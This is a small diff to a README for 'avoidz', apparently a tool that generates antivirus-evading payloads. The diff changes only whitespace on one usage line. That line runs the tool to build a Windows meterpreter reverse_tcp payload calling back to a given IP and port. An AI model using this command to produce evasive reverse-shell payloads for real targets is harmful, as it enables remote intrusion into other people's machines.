@@ -34,7 +34,7 @@
 
     4°- Run avoidz tool == example
          sudo ./avoidz.rb == help command
-	 sudo ./avoidz.rb -h 192.168.1.3 -p 666 -m windows/meterpreter/reverse_tcp -f temp1 == generate
+	  sudo ./avoidz.rb -h 192.168.1.3 -p 666 -m windows/meterpreter/reverse_tcp -f temp1 == generate
 
 ## video tutorial: 
 Avoidz v 1.0 temp1 generate :
